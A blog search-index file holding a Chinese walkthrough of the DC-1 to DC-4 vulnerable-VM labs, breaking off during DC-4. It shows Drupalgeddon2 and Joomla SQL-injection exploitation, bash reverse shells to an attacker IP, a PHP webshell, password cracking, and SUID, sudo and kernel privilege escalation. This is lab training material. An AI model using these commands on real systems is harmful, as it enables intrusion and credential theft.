<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>DC靶场系列</title>
    <url>/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/</url>
    <content><![CDATA[<h2 id="DC-1渗透过程"><a href="#DC-1渗透过程" class="headerlink" title="DC-1渗透过程"></a><strong>DC-1渗透过程</strong></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">arp-scan -l <span class="comment">#发现主机ip</span></span><br><span class="line">nmap -sV -A <span class="number">192.168</span><span class="number">.126</span><span class="number">.141</span> <span class="comment">#详细端口服务扫描</span></span><br><span class="line"><span class="comment">###发现了80端口是drupal7 服务，开启msf查找漏洞</span></span><br><span class="line">msf5 &gt; search drupal</span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line">   <span class="comment">#  Name                                           Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -  ----                                           ---------------  ----       -----  -----------</span><br><span class="line">   <span class="number">0</span>  auxiliary/gather/drupal_openid_xxe             <span class="number">2012</span><span class="number">-10</span><span class="number">-17</span>       normal     Yes    Drupal OpenID External Entity Injection</span><br><span class="line">   <span class="number">4</span>  exploit/unix/webapp/drupal_drupalgeddon2       <span class="number">2018</span><span class="number">-03</span><span class="number">-28</span>       excellent  Yes    Drupal Drupalgeddon <span class="number">2</span> Forms API Property Injection</span><br><span class="line"></span><br><span class="line">msf5 &gt; use exploit/unix/webapp/drupal_drupalgeddon2 </span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set rhosts <span class="number">192.168</span><span class="number">.126</span><span class="number">.153</span></span><br><span class="line">rhosts =&gt; 192.168.126.153</span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on <span class="number">192.168</span><span class="number">.126</span><span class="number">.33</span>:<span class="number">4444</span> </span><br><span class="line">meterpreter &gt; </span><br><span class="line"><span class="comment">#成功进入目标服务器，为稳定连接，可以反弹shell到本地</span></span><br><span class="line">python -c <span class="string">"import pty;pty.spawn('/bin/bash')"</span>  <span class="comment">#获取交互shell</span></span><br><span class="line">www-data@DC<span class="number">-1</span>:/var/www$ bash -i &amp;&gt; /dev/tcp/<span class="number">192.168</span><span class="number">.126</span><span class="number">.33</span>/<span class="number">2333</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span> <span class="comment">#反弹bash</span></span><br><span class="line">root@kali:~<span class="comment"># nc -lvp 2333 #本地监听</span></span><br><span class="line">listening on [any] <span class="number">2333</span> ...</span><br><span class="line"><span class="number">192.168</span><span class="number">.126</span><span class="number">.153</span>: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [<span class="number">192.168</span><span class="number">.126</span><span class="number">.33</span>] <span class="keyword">from</span> (UNKNOWN) [<span class="number">192.168</span><span class="number">.126</span><span class="number">.153</span>] <span class="number">51022</span></span><br><span class="line">www-data@DC<span class="number">-1</span>:/var/www$ python -c <span class="string">"import pty;pty.spawn('/bin/bash')"</span> <span class="comment">#这里再反弹一个更稳定</span></span><br></pre></td></tr></table></figure>

<p><strong>本地发现flag1、提示查看数据库配置文件，发现flag2，给了数据库的账号密码，连接数据库看看</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">www<span class="literal">-data</span>@DC<span class="literal">-1</span>:/var/www<span class="variable">$</span> mysql <span class="literal">-u</span> dbuser <span class="literal">-p</span>  <span class="comment">#连接数据库</span></span><br><span class="line">Enter password: R0ck3t</span><br><span class="line">mysql&gt; show databases;  </span><br><span class="line">show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| drupaldb           |</span><br><span class="line">+--------------------+</span><br><span class="line"><span class="number">2</span> rows <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br><span class="line">mysql&gt; select * from users \G;</span><br><span class="line">select * from users \G;</span><br><span class="line">*************************** <span class="number">2</span>. row ***************************</span><br><span class="line">             uid: <span class="number">1</span></span><br><span class="line">            name: admin</span><br><span class="line">            pass: <span class="variable">$S</span><span class="variable">$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5</span>.i38jnEKuDR</span><br><span class="line">            mail: admin@example.com</span><br><span class="line">           theme: </span><br><span class="line">       signature: </span><br><span class="line">signature_format: NULL</span><br><span class="line">         created: <span class="number">1550581826</span></span><br><span class="line">          access: <span class="number">1550583852</span></span><br><span class="line">           login: <span class="number">1550582362</span></span><br><span class="line">          status: <span class="number">1</span></span><br><span class="line">        timezone: Australia/Melbourne</span><br><span class="line">        language: </span><br><span class="line">         picture: <span class="number">0</span></span><br><span class="line">            init: admin@example.com</span><br><span class="line">            <span class="keyword">data</span>: b:<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">###修改数据库admin的密码，这里用自带的hash加密求hash值</span></span><br><span class="line">www<span class="literal">-data</span>@DC<span class="literal">-1</span>:/var/www<span class="variable">$</span> php scripts/password<span class="literal">-hash</span>.sh <span class="number">123456</span></span><br><span class="line">password: <span class="number">123456</span>                hash: <span class="variable">$S</span><span class="variable">$DvvyyPuAd4L6M</span>/fZV0kmnokciLomH5YSvUZ.w.aaALZpqe1zMTtV</span><br><span class="line"><span class="comment">#更新数据库密码</span></span><br><span class="line">update users set pass=<span class="string">'$S$DRP9A87VYWMUnTb4Dl7yivYAlibCNONO32cCB3Qc1LT5Alr90rAu'</span> where uid=<span class="number">1</span>;</span><br><span class="line"><span class="comment">#登陆网页发现flag3，提示查看/etc/passwd</span></span><br><span class="line"><span class="comment">#提权，寻找有suid权限的文件</span></span><br><span class="line">find / <span class="literal">-perm</span> <span class="literal">-u</span>=s <span class="literal">-type</span> f <span class="number">2</span>&gt;/dev/null</span><br><span class="line">find / <span class="literal">-perm</span> /<span class="number">4000</span> <span class="number">2</span>&gt;/dev/null</span><br><span class="line">touch test <span class="comment"># 创建一个空文件</span></span><br><span class="line">find test <span class="literal">-exec</span> <span class="string">'whoami'</span> \; <span class="comment">#查看是否提权</span></span><br><span class="line">find test <span class="literal">-exec</span> <span class="string">'/bin/sh'</span> \;<span class="comment">#将root的bash反弹</span></span><br><span class="line"><span class="comment">#cd /root 找到最终的flag文件</span></span><br><span class="line">cat final<span class="literal">-flag</span>.txt</span><br><span class="line"> __    __     _ _       _                    _ </span><br><span class="line">/ / /\ \ \___| | |   __| | ___  _ __   ___  / \</span><br><span class="line">\ \/  \/ / _ \ | |  / _` |/ _ \| <span class="string">'_ \ / _ \/  /</span></span><br><span class="line"><span class="string"> \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ </span></span><br><span class="line"><span class="string">  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Congratulatons!!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">A special thanks to all those who sent me tweets</span></span><br><span class="line"><span class="string">and provided me with feedback - it'</span>s all greatly</span><br><span class="line">appreciated.</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="DC-2渗透过程"><a href="#DC-2渗透过程" class="headerlink" title="DC-2渗透过程"></a><strong>DC-2渗透过程</strong></h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sV -A -p- dc-2 #全端口扫描更具体</span></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line"><span class="number">80</span>/tcp   open  http    Apache httpd <span class="number">2.4</span>.<span class="number">10</span> ((Debian))</span><br><span class="line">|_http<span class="literal">-generator</span>: WordPress <span class="number">4.7</span>.<span class="number">10</span></span><br><span class="line">|_http<span class="literal">-server</span><span class="literal">-header</span>: Apache/<span class="number">2.4</span>.<span class="number">10</span> (Debian)</span><br><span class="line">|_http<span class="literal">-title</span>: DC<span class="literal">-2</span> &amp;<span class="comment">#8211; Just another WordPress site</span></span><br><span class="line">|_https<span class="literal">-redirect</span>: ERROR: Script execution failed (use <span class="literal">-d</span> to debug)</span><br><span class="line"><span class="number">7744</span>/tcp open  ssh     OpenSSH <span class="number">6.7</span>p1 Debian <span class="number">5</span>+deb8u7 (protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh<span class="literal">-hostkey</span>: </span><br><span class="line">|   <span class="number">1024</span> <span class="number">52</span>:<span class="number">51</span>:<span class="number">7</span>b:<span class="number">6</span>e:<span class="number">70</span>:a4:<span class="number">33</span>:<span class="number">7</span>a:d2:<span class="number">4</span>b:e1:<span class="number">0</span>b:<span class="number">5</span>a:<span class="number">0</span>f:<span class="number">9</span>e:d7 (DSA)</span><br><span class="line">|   <span class="number">2048</span> <span class="number">59</span>:<span class="number">11</span>:d8:af:<span class="number">38</span>:<span class="number">51</span>:<span class="number">8</span>f:<span class="number">41</span>:a7:<span class="number">44</span>:b3:<span class="number">28</span>:<span class="number">03</span>:<span class="number">80</span>:<span class="number">99</span>:<span class="number">42</span> (RSA)</span><br><span class="line">|   <span class="number">256</span> df:<span class="number">18</span>:<span class="number">1</span>d:<span class="number">74</span>:<span class="number">26</span>:ce:c1:<span class="number">4</span>f:<span class="number">6</span>f:<span class="number">2</span>f:c1:<span class="number">26</span>:<span class="number">54</span>:<span class="number">31</span>:<span class="number">51</span>:<span class="number">91</span> (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> d9:<span class="number">38</span>:<span class="number">5</span>f:<span class="number">99</span>:<span class="number">7</span>c:<span class="number">0</span>d:<span class="number">64</span>:<span class="number">7</span>e:<span class="number">1</span>d:<span class="number">46</span>:f6:e9:<span class="number">7</span>c:c6:<span class="number">37</span>:<span class="number">17</span> (ED25519)</span><br><span class="line"></span><br><span class="line"><span class="comment">#访问80端口，发现重定向到http://dc-2</span></span><br><span class="line">root@kali:~<span class="comment"># vi /etc/hosts #写入ip dc-2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#访问发现是wordpress，用wpscan扫描</span></span><br><span class="line">root@kali:~<span class="comment"># wpscan --url http://dc-2 -e u</span></span><br><span class="line"></span><br><span class="line"><span class="function">[<span class="type">i</span>] <span class="title">User</span></span>(s) Identified:</span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line">[+] jerry</span><br><span class="line"> | Found By: Wp Json Api (Aggressive Detection)</span><br><span class="line">[+] tom</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># cewl -w passwd.txt http://dc-2</span></span><br><span class="line">CeWL <span class="number">5.4</span>.<span class="number">7</span> (Exclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># wpscan --url http://dc-2 -U users.txt -P passwd.txt </span></span><br><span class="line"></span><br><span class="line">[<span class="type">i</span>] Valid Combinations Found:</span><br><span class="line"> | Username: jerry, Password: adipiscing</span><br><span class="line"> | Username: tom, Password: parturient</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># ssh tom@192.168.126.153 -p 7744</span></span><br></pre></td></tr></table></figure>



<p>连接到tom主机上后发现大部分命令无法使用，查看环境变量发现没用/bin/bash，需要添加环境变量才可以正常执行bash，查看可执行的命令（这里有个查询的小技巧，免去一个个尝试），发现可正常执行vi，在vi中可执行命令，可利用此添加环境变量</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tom@DC<span class="number">-2</span>:~$ export  <span class="comment">#查看环境变量</span></span><br><span class="line">declare -x HOME=<span class="string">"/home/tom"</span></span><br><span class="line">declare -x LANG=<span class="string">"en_US.UTF-8"</span></span><br><span class="line">declare -x LOGNAME=<span class="string">"tom"</span></span><br><span class="line">declare -x MAIL=<span class="string">"/var/mail/tom"</span></span><br><span class="line">declare -x OLDPWD</span><br><span class="line">declare -rx PATH=<span class="string">"/home/tom/usr/bin"</span></span><br><span class="line">declare -x PWD=<span class="string">"/home/tom"</span></span><br><span class="line">declare -rx SHELL=<span class="string">"/bin/rbash"</span></span><br><span class="line">declare -x SHLVL=<span class="string">"1"</span></span><br><span class="line">declare -x SSH_CLIENT=<span class="string">"192.168.126.33 35824 7744"</span></span><br><span class="line">declare -x SSH_CONNECTION=<span class="string">"192.168.126.33 35824 192.168.126.154 7744"</span></span><br><span class="line">declare -x SSH_TTY=<span class="string">"/dev/pts/1"</span></span><br><span class="line">declare -x TERM=<span class="string">"xterm-256color"</span></span><br><span class="line">declare -x USER=<span class="string">"tom"</span></span><br><span class="line"></span><br><span class="line">tom@DC<span class="number">-2</span>:~$ echo $PATH</span><br><span class="line">/home/tom/usr/bin</span><br><span class="line"></span><br><span class="line">tom@DC<span class="number">-2</span>:~$ echo /home/tom/usr/bin/*  <span class="comment">#查询可执行命令</span></span><br><span class="line">/home/tom/usr/bin/less /home/tom/usr/bin/ls /home/tom/usr/bin/scp /home/tom/usr/bin/vi</span><br><span class="line"></span><br><span class="line">vi</span><br><span class="line">:set shell=/bin/sh</span><br><span class="line">:shell</span><br><span class="line">$ export PATH=$PATH:/bin/ <span class="comment"># 导入环境变量</span></span><br><span class="line">$ export PATH=$PATH:/usr/bin</span><br><span class="line"></span><br><span class="line">jerry@DC<span class="number">-2</span>:/home/tom$ sudo -l  <span class="comment">#查看可执行root权限的命令</span></span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> jerry on DC<span class="number">-2</span>:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User jerry may run the following commands on DC<span class="number">-2</span>:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/git</span><br><span class="line"></span><br><span class="line"><span class="comment">#这里提示可利用git提权</span></span><br><span class="line">root@DC<span class="number">-2</span>:/home/jerry<span class="comment"># cat flag4.txt </span></span><br><span class="line">Good to see that yo<span class="string">u've made it this far - but you'</span>re <span class="keyword">not</span> home yet. </span><br><span class="line">You still need to get the final flag (the only flag that really counts!!!).  </span><br><span class="line">No hints here - yo<span class="string">u're on your own now.  :-)</span></span><br><span class="line"><span class="string">Go on - git outta here!!!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">jerry@DC-2:/home/tom$ sudo git help config</span></span><br><span class="line"><span class="string">！/bin/sh</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@DC-2:~# cat final-flag.txt </span></span><br><span class="line"><span class="string"> __    __     _ _       _                    _ </span></span><br><span class="line"><span class="string">/ / /\ \ \___| | |   __| | ___  _ __   ___  / \</span></span><br><span class="line"><span class="string">\ \/  \/ / _ \ | |  / _` |/ _ \| '</span>_ \ / _ \/  /</span><br><span class="line"> \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ </span><br><span class="line">  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   </span><br><span class="line"></span><br><span class="line">Congratulatons!!!</span><br></pre></td></tr></table></figure>



<hr>
<h2 id="DC-3渗透过程"><a href="#DC-3渗透过程" class="headerlink" title="DC-3渗透过程"></a><strong>DC-3渗透过程</strong></h2><p><strong>就开放了80端口，可用wappalyzer插件查看cms指纹等信息，发现是joomla框架</strong></p>
<p><img src="/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/1.png" alt></p>
<p><strong>利用joomscan扫描出后台登陆地址、版本信息以及相关目录，然后查询相关漏洞信息进行利用！</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">root@kali:~/tools/joomscan<span class="comment"># perl joomscan.pl -u http://192.168.126.150</span></span><br><span class="line">[+] Detecting Joomla Version</span><br><span class="line">[++] Joomla <span class="number">3.7</span>.<span class="number">0</span></span><br><span class="line">[+] Checking Directory Listing</span><br><span class="line">[++] directory has directory listing : </span><br><span class="line">http://<span class="number">192.168</span>.<span class="number">126.150</span>/administrator/components</span><br><span class="line">http://<span class="number">192.168</span>.<span class="number">126.150</span>/administrator/modules</span><br><span class="line">[+] admin finder</span><br><span class="line">[++] Admin page : http://<span class="number">192.168</span>.<span class="number">126.150</span>/administrator/</span><br><span class="line"></span><br><span class="line">root@kali:~/tools/joomscan<span class="comment"># searchsploit joomla 3.7.0</span></span><br><span class="line">Joomla! <span class="number">3.7</span>.<span class="number">0</span> - <span class="string">'com_fields'</span> SQL Injection                                                           | exploits/php/webapps/<span class="number">42033</span>.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看漏洞利用方式，存在SQL注入漏洞，相关sqlmap使用方式也列出来了</span></span><br><span class="line">root@kali:~/tools/joomscan<span class="comment"># cat /usr/share/exploitdb/exploits/php/webapps/42033.txt</span></span><br><span class="line"><span class="comment"># Exploit Title: Joomla 3.7.0 - Sql Injection</span></span><br><span class="line"><span class="comment"># Date: 05-19-2017</span></span><br><span class="line"><span class="comment"># CVE : - CVE-2017-8917</span></span><br><span class="line"></span><br><span class="line">URL Vulnerable: http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[<span class="type">fullordering</span>]=updatexml%<span class="number">27</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Using</span> Sqlmap: </span><br><span class="line"></span><br><span class="line">sqlmap <span class="literal">-u</span> <span class="string">"http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml"</span> -<span class="literal">-risk</span>=<span class="number">3</span> -<span class="literal">-level</span>=<span class="number">5</span> -<span class="literal">-random</span><span class="literal">-agent</span> -<span class="literal">-dbs</span> <span class="literal">-p</span> list[<span class="type">fullordering</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#sqlmap爆破出管理员账号和密码</span></span><br><span class="line">root@kali:~/tools/joomscan<span class="comment"># sqlmap -u "http://192.168.126.150/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk 3 -D joomladb -t</span></span><br><span class="line"></span><br><span class="line">root@kali:~/tools/joomscan<span class="comment"># sqlmap -u "http://192.168.126.150/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk 3 -D joomladb -T "#__users" -C username,password --dump</span></span><br><span class="line"></span><br><span class="line">+----------+--------------------------------------------------------------+</span><br><span class="line">| username | password                                                     |</span><br><span class="line">+----------+--------------------------------------------------------------+</span><br><span class="line">| admin    | <span class="variable">$2y</span><span class="variable">$10</span><span class="variable">$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</span> |</span><br><span class="line">+----------+--------------------------------------------------------------+</span><br></pre></td></tr></table></figure>

<p><strong>得到的密码是hash值，可以利用hashcat进行爆破，密码本用kail自带的rockyou.txt</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># hashid hash.txt </span></span><br><span class="line">-<span class="operator">-File</span> <span class="string">'hash.txt'</span>--</span><br><span class="line">Analyzing <span class="string">'$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu'</span></span><br><span class="line"><span class="function">[+] <span class="title">Blowfish</span></span>(OpenBSD) </span><br><span class="line">[+] Woltlab Burning Board <span class="number">4</span>.x </span><br><span class="line">[+] bcrypt </span><br><span class="line">root@kali:~<span class="comment"># hashcat -m 3200 -a 0 -d 1 --force hash.txt rockyou.txt</span></span><br><span class="line">hashcat (v5.<span class="number">1.0</span>) starting...</span><br><span class="line"><span class="variable">$2y</span><span class="variable">$10</span><span class="variable">$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu:snoopy</span></span><br></pre></td></tr></table></figure>

<p><strong>得到密码为snoopy，登陆后台在template处添加shell.php写入一句话木马，用蚁剑连接，注意木马的路径，此处有提示</strong></p>
<p><img src="/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/2.png" alt></p>
<p><strong>进入服务器后，发现无法提权，看看该版本系统是否存有漏洞，这里选择了Linux Kernel (Ubuntu 16.04) - Reference Count Overflow Using BPF Maps  | exploits/linux/dos/39773.txt  进行内核提权</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">bash -c <span class="string">'sh -i &amp;&gt;/dev/tcp/192.168.126.33/4444 0&gt;&amp;1'</span>  <span class="comment">#反弹shell</span></span><br><span class="line">root@kali:~<span class="comment"># searchsploit ubuntu 16.04</span></span><br><span class="line">------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                                             |  Path</span><br><span class="line">                                                                                           | (/usr/share/exploitdb/)</span><br><span class="line">------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Apport <span class="number">2.</span>x (Ubuntu Desktop <span class="number">12.10</span> &lt; <span class="number">16.04</span>) - Local Code Execution                           | exploits/linux/local/<span class="number">40937.</span>txt</span><br><span class="line">Exim <span class="number">4</span> (Debian <span class="number">8</span> / Ubuntu <span class="number">16.04</span>) - Spool Privilege Escalation                              | exploits/linux/local/<span class="number">40054.</span>c</span><br><span class="line">Google Chrome (Fedora <span class="number">25</span> / Ubuntu <span class="number">16.04</span>) - <span class="string">'tracker-extract'</span> / <span class="string">'gnome-video-thumbnailer'</span> + | exploits/linux/local/<span class="number">40943.</span>txt</span><br><span class="line">LightDM (Ubuntu <span class="number">16.04</span>/<span class="number">16.10</span>) - <span class="string">'Guest Account'</span> Local Privilege Escalation                  | exploits/linux/local/<span class="number">41923.</span>txt</span><br><span class="line">Linux Kernel (Debian <span class="number">7.7</span>/<span class="number">8.5</span>/<span class="number">9.0</span> / Ubuntu <span class="number">14.04</span><span class="number">.2</span>/<span class="number">16.04</span><span class="number">.2</span>/<span class="number">17.04</span> / Fedora <span class="number">22</span>/<span class="number">25</span> / CentOS <span class="number">7.</span> | exploits/linux_x86<span class="number">-64</span>/local/<span class="number">42275.</span>c</span><br><span class="line">Linux Kernel (Debian <span class="number">9</span>/<span class="number">10</span> / Ubuntu <span class="number">14.04</span><span class="number">.5</span>/<span class="number">16.04</span><span class="number">.2</span>/<span class="number">17.04</span> / Fedora <span class="number">23</span>/<span class="number">24</span>/<span class="number">25</span>) - <span class="string">'ldso_dynami | exploits/linux_x86/local/42276.c</span></span><br><span class="line"><span class="string">Linux Kernel (Ubuntu 16.04) - Reference Count Overflow Using BPF Maps                      | exploits/linux/dos/39773.txt</span></span><br><span class="line"><span class="string">Linux Kernel 4.14.7 (Ubuntu 16.04 / CentOS 7) - (KASLR &amp; SMEP Bypass) Arbitrary File Read  | exploits/linux/local/45175.c</span></span><br><span class="line"><span class="string">Linux Kernel 4.4 (Ubuntu 16.04) - '</span>BPF<span class="string">' Local Privilege Escalation (Metasploit)            | exploits/linux/local/40759.rb</span></span><br><span class="line"><span class="string">Linux Kernel 4.4 (Ubuntu 16.04) - '</span>snd_timer_user_ccallback()<span class="string">' Kernel Pointer Leak         | exploits/linux/dos/46529.c</span></span><br><span class="line"><span class="string">Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - '</span>AF_PACKET<span class="string">' Race Condition Privilege Esca | exploits/linux_x86-64/local/40871.c</span></span><br><span class="line"><span class="string">Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter target_offset Out-of-Bounds Privilege | exploits/linux_x86-64/local/40049.c</span></span><br><span class="line"><span class="string">Linux Kernel 4.4.0-21 &lt; 4.4.0-51 (Ubuntu 14.04/16.04 x86-64) - '</span>AF_PACKET<span class="string">' Race Condition  | exploits/linux/local/47170.c</span></span><br><span class="line"><span class="string">Linux Kernel 4.4.x (Ubuntu 16.04) - '</span>double-fdput()<span class="string">' bpf(BPF_PROG_LOAD) Privilege Escalati | exploits/linux/local/39772.txt</span></span><br><span class="line"><span class="string">Linux Kernel 4.6.2 (Ubuntu 16.04.1) - '</span>IP6T_SO_SET_REPLACE<span class="string">' Local Privilege Escalation     | exploits/linux/local/40489.txt</span></span><br><span class="line"><span class="string">Linux Kernel 4.8 (Ubuntu 16.04) - Leak sctp Kernel Pointer                                 | exploits/linux/dos/45919.c</span></span><br><span class="line"><span class="string">Linux Kernel &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation              | exploits/linux/local/45010.c</span></span><br><span class="line"><span class="string">Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                     | exploits/linux/local/44298.c</span></span><br><span class="line"><span class="string">Linux Kernel &lt; 4.4.0-21 (Ubuntu 16.04 x64) - '</span>netfilter target_offset<span class="string">' Local Privilege Esc | exploits/linux/local/44300.c</span></span><br><span class="line"><span class="string">Linux Kernel &lt; 4.4.0-83 / &lt; 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KA | exploits/linux/local/43418.c</span></span><br><span class="line"><span class="string">Linux Kernel &lt; 4.4.0/ &lt; 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Priv | exploits/linux/local/47169.c</span></span><br><span class="line"><span class="string">------------------------------------------------------------------------------------------- ----------------------------------------</span></span><br></pre></td></tr></table></figure>

<p><strong>查看该exp的使用方法，先执行compile.sh、再执行doubleput即可</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># cp /usr/share/exploitdb/exploits/linux/local/39772.txt ubuntu_v1604_shell.txt</span></span><br><span class="line">root@kali:~<span class="comment"># cat ubuntu_v1604_shell.txt </span></span><br><span class="line">An exploit that puts all this together is <span class="keyword">in</span> exploit.tar. Usage:</span><br><span class="line"></span><br><span class="line">user@host:~/ebpf_mapfd_doubleput<span class="variable">$</span> ./compile.sh</span><br><span class="line">user@host:~/ebpf_mapfd_doubleput<span class="variable">$</span> ./doubleput</span><br><span class="line">starting writev</span><br><span class="line">woohoo, got pointer reuse</span><br><span class="line">writev returned successfully. <span class="keyword">if</span> this worked, you<span class="string">'ll have a root shell in &lt;=60 seconds.</span></span><br><span class="line"><span class="string">suid file detected, launching rootshell...</span></span><br><span class="line"><span class="string">we have root privs now...</span></span><br><span class="line"><span class="string">root@host:~/ebpf_mapfd_doubleput# id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),999(vboxsf),1000(user)</span></span><br></pre></td></tr></table></figure>

<p>先下载到本地解压缩后，开启本地的web服务器，上传到目标服务器，由于文件过大，蚁剑无法上传</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</span></span><br><span class="line">unzip <span class="number">39772.</span>zip</span><br><span class="line">cd <span class="number">39772</span></span><br><span class="line">root@kali:~<span class="comment"># python -m SimpleHTTPServer 8000  #搭建http服务，提供文件浏览的web服务</span></span><br><span class="line">Serving HTTP on <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> port <span class="number">8000</span> ...</span><br><span class="line">$ wget http://<span class="number">192.168</span><span class="number">.126</span><span class="number">.33</span>:<span class="number">8000</span>/exploit.tar <span class="comment">#下载文件</span></span><br><span class="line">tar -xvf exploit.tar</span><br><span class="line">cd ebpf_mapfd_doubleput_exploit</span><br><span class="line">./compile.sh </span><br><span class="line">./doubleput</span><br><span class="line">cat the-flag.txt</span><br><span class="line"> __        __   _ _   ____                   _ _ _ _ </span><br><span class="line"> \ \      / /__| | | |  _ \  ___  _ __   ___| | | | |</span><br><span class="line">  \ \ /\ / / _ \ | | | | | |/ _ \| <span class="string">'_ \ / _ \ | | | |</span></span><br><span class="line"><span class="string">   \ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|</span></span><br><span class="line"><span class="string">    \_/\_/ \___|_|_| |____/ \___/|_| |_|\___(_|_|_|_)</span></span><br><span class="line"><span class="string">                                                     </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Congratulations are in order.  :-)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">I hope you'</span>ve enjoyed this challenge <span class="keyword">as</span> I enjoyed making it.</span><br></pre></td></tr></table></figure>



<hr>
<h2 id="DC-4渗透过程"><a href="#DC-4渗透过程" class="headerlink" title="DC-4渗透过程"></a><strong>DC-4渗透过程</strong></h2><p><strong>登陆页面，提示用admin登陆，这里用password.list密码本爆破，rockyou.txt需要很久时间，求出密码后登陆发现可以执行命令有回显，抓包修改反弹shell，发现了一个密码本，可能是用来爆破ssh账号的，用scp发送到本地</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">root@kali:/usr/share/john<span class="comment"># hydra -l admin -P ./password.lst -f 192.168.126.149 http-post-form "/login.php:username=^USER^&amp;password=^PASS^:S=logout" -v</span></span><br><span class="line"></span><br><span class="line">[<span class="type">VERBOSE</span>] Page redirected to http://<span class="number">192.168</span>.<span class="number">126.149</span>/index.php</span><br><span class="line">[<span class="type">VERBOSE</span>] Page redirected to http://<span class="number">192.168</span>.<span class="number">126.149</span>/index.php</span><br><span class="line">[<span class="number">80</span>][<span class="type">http</span>-<span class="type">post</span>-<span class="type">form</span>] host: <span class="number">192.168</span>.<span class="number">126.149</span>   login: admin   password: happy</span><br><span class="line"></span><br><span class="line"><span class="comment">#将文件发送到本地</span></span><br><span class="line">root@dc<span class="literal">-4</span>:/home/jim/backups<span class="comment"># scp ./old-passwords.bak root@192.168.126.33:/root/tools</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#密码爆破，-t 64 表示线程数  -f 表示找到密码即停   